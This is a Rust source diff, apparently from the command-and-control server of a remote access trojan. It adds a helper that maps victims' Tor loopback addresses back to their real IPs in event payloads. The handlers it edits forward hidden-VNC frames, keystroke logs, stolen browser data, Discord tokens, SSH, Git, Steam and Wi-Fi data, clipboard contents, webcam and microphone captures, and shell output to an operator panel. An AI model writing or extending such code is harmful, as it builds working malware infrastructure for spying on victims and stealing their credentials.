@@ -72,6 +72,18 @@ impl ServerWrapper {
         Ok(())
     }
 
+    /// Reverse of resolve_addr: given a socket addr (the internal key), returns
+    /// the display addr string that the frontend expects in event payloads.
+    /// Returns the socket addr string if no display mapping exists.
+    fn display_addr(&self, socket_addr: &SocketAddr) -> String {
+        for (display, sock) in &self.display_to_socket {
+            if sock == socket_addr {
+                return display.clone();
+            }
+        }
+        socket_addr.to_string()
+    }
+
     /// Resolve a SocketAddr that may be a display addr (real IP) back to the
     /// actual socket addr used as the internal key.  When a Tor client connects,
     /// the socket addr is 127.0.0.1:port but the frontend uses the real IP.
@@ -299,7 +311,7 @@ impl ServerWrapper {
                         self.emit_serde_payload(
                             "inputbox_result",
                             serde_json::json!({
-                                "addr": addr.to_string(),
+                                "addr": self.display_addr(&addr),
                                 "result": result
                             }),
                         )
@@ -586,11 +598,12 @@ impl ServerWrapper {
                 }
 
                 HVNCFrame(addr, data) => {
-                    println!("HVNCFrame received from {}", addr);
+                    let display = self.display_addr(&addr);
+                    println!("HVNCFrame received from {}", display);
                     self.emit_serde_payload(
                         "hvnc_frame",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": display,
                             "data": general_purpose::STANDARD.encode(&data)
                         }),
                     )
@@ -598,10 +611,11 @@ impl ServerWrapper {
                 }
 
                 HVNCFrameAudioChunk(addr, chunk) => {
+                    let display = self.display_addr(&addr);
                     self.emit_serde_payload(
                         "hvnc_frame_audio_chunk",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": display,
                             "timestamp": chunk.timestamp,
                             "sampleRate": chunk.sample_rate,
                             "channels": chunk.channels,
@@ -613,10 +627,11 @@ impl ServerWrapper {
 
                 ScreenshotData(addr, data) => {
                     if let Some(_client) = self.connected_users.get(&addr) {
+                        let display = self.display_addr(&addr);
                         self.emit_serde_payload(
                             "client_screenshot",
                             serde_json::json!({
-                                "addr": addr.to_string(),
+                                "addr": display,
                                 "data": format!("data:image/jpeg;base64,{}", general_purpose::STANDARD.encode(&data.data))
                             }),
                         ).await;
@@ -629,7 +644,7 @@ impl ServerWrapper {
                         "process list",
                         "process_list",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "processes": process_list.processes.clone()
                         }),
                     )
@@ -642,7 +657,7 @@ impl ServerWrapper {
                         "shell output",
                         "client_shellout",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "shell_output": output.clone()
                         }),
                     )
@@ -650,10 +665,11 @@ impl ServerWrapper {
                 }
 
                 RemoteDesktopFrame(addr, frame) => {
+                    let display = self.display_addr(&addr);
                     self.emit_serde_payload(
                         "remote_desktop_frame",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": display,
                             "timestamp": frame.timestamp,
                             "display": frame.display,
                             "data": general_purpose::STANDARD.encode(&frame.data),
@@ -663,10 +679,11 @@ impl ServerWrapper {
                 }
 
                 RemoteDesktopAudioChunk(addr, chunk) => {
+                    let display = self.display_addr(&addr);
                     self.emit_serde_payload(
                         "remote_desktop_audio_chunk",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": display,
                             "timestamp": chunk.timestamp,
                             "sampleRate": chunk.sample_rate,
                             "channels": chunk.channels,
@@ -677,10 +694,11 @@ impl ServerWrapper {
                 }
 
                 MicAudioChunk(addr, chunk) => {
+                    let display = self.display_addr(&addr);
                     self.emit_serde_payload(
                         "mic_audio_chunk",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": display,
                             "timestamp": chunk.timestamp,
                             "sampleRate": chunk.sample_rate,
                             "channels": chunk.channels,
@@ -691,9 +709,10 @@ impl ServerWrapper {
                 }
 
                 MicRecordingFile(addr, file_data) => {
+                    let display = self.display_addr(&addr);
                     let transfer_id = format!(
                         "mic_recording_{}_{}",
-                        addr.to_string().replace(":", "_"),
+                        display.replace(":", "_"),
                         file_data.name
                     );
                     let total = file_data.data.len();
@@ -703,7 +722,7 @@ impl ServerWrapper {
                         "file_transfer_start",
                         serde_json::json!({
                             "id": transfer_id,
-                            "addr": addr.to_string(),
+                            "addr": display,
                             "filename": file_data.name,
                             "total": total,
                             "status": "started",
@@ -714,7 +733,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "mic_recording_file",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": display,
                             "name": file_data.name,
                             "data": general_purpose::STANDARD.encode(&file_data.data),
                         }),
@@ -727,7 +746,7 @@ impl ServerWrapper {
                         "file_transfer_complete",
                         serde_json::json!({
                             "id": transfer_id,
-                            "addr": addr.to_string(),
+                            "addr": display,
                             "filename": file_data.name,
                             "total": total,
                             "speed": speed,
@@ -741,7 +760,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "desktop_recording_preview",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "timestamp": frame.timestamp,
                             "display": frame.display,
                             "width": frame.width,
@@ -765,7 +784,7 @@ impl ServerWrapper {
                         "file_transfer_start",
                         serde_json::json!({
                             "id": transfer_id,
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "filename": file_data.name,
                             "total": total,
                             "status": "started",
@@ -776,7 +795,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "desktop_recording_file",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "name": file_data.name,
                             "data": general_purpose::STANDARD.encode(&file_data.data),
                         }),
@@ -789,7 +808,7 @@ impl ServerWrapper {
                         "file_transfer_complete",
                         serde_json::json!({
                             "id": transfer_id,
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "filename": file_data.name,
                             "total": total,
                             "speed": speed,
@@ -803,7 +822,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "mic_device_list",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "devices": devices,
                         }),
                     )
@@ -815,7 +834,7 @@ impl ServerWrapper {
                         self.emit_serde_payload(
                             "webcam_result",
                             serde_json::json!({
-                                "addr": addr.to_string(),
+                                "addr": self.display_addr(&addr),
                                 "data": format!("data:image/jpeg;base64,{}", general_purpose::STANDARD.encode(&jpeg_data)),
                             }),
                         ).await;
@@ -826,7 +845,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "files_result",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "files": files
                         }),
                     )
@@ -837,7 +856,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "current_folder",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "path": path
                         }),
                     )
@@ -856,7 +875,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "files_result",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "files": files
                         }),
                     )
@@ -886,7 +905,7 @@ impl ServerWrapper {
                             "file_transfer_start",
                             serde_json::json!({
                                 "id": transfer_id,
-                                "addr": addr.to_string(),
+                                "addr": self.display_addr(&addr),
                                 "filename": file_data.name,
                                 "total": total,
                                 "status": "started",
@@ -897,7 +916,7 @@ impl ServerWrapper {
                         self.emit_serde_payload(
                             "download_file_result",
                             serde_json::json!({
-                                "addr": addr.to_string(),
+                                "addr": self.display_addr(&addr),
                                 "name": file_data.name,
                                 "data": general_purpose::STANDARD.encode(&file_data.data),
                             }),
@@ -910,7 +929,7 @@ impl ServerWrapper {
                             "file_transfer_complete",
                             serde_json::json!({
                                 "id": transfer_id,
-                                "addr": addr.to_string(),
+                                "addr": self.display_addr(&addr),
                                 "filename": file_data.name,
                                 "total": total,
                                 "speed": speed,
@@ -1033,7 +1052,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "keylogger_update",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "window": update.window_title,
                             "data": update.key_data
                         }),
@@ -1045,7 +1064,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "keylogger_offline_logs",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "logs": logs
                         }),
                     )
@@ -1056,7 +1075,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "browser_data",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "data": data
                         }),
                     )
@@ -1114,7 +1133,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "discord_tokens",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "tokens": data.tokens,
                         }),
                     )
@@ -1125,7 +1144,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "wifi_data",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "data": data,
                         }),
                     )
@@ -1136,7 +1155,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "software_inventory",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "data": data,
                         }),
                     )
@@ -1147,7 +1166,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "software_icon_result",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "data": data,
                         }),
                     )
@@ -1158,7 +1177,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "software_action_result",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "data": data,
                         }),
                     )
@@ -1169,7 +1188,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "git_data",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "data": data,
                         }),
                     )
@@ -1180,7 +1199,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "ssh_data",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "data": data,
                         }),
                     )
@@ -1191,7 +1210,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "steam_data",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "data": data,
                         }),
                     )
@@ -1202,7 +1221,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "clipboard_update",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "data": data,
                         }),
                     )
@@ -1213,7 +1232,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "clipboard_image_update",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "data": data,
                         }),
                     )
@@ -1224,7 +1243,7 @@ impl ServerWrapper {
                     self.emit_serde_payload(
                         "notification_event",
                         serde_json::json!({
-                            "addr": addr.to_string(),
+                            "addr": self.display_addr(&addr),
                             "data": data,
                         }),
                     )
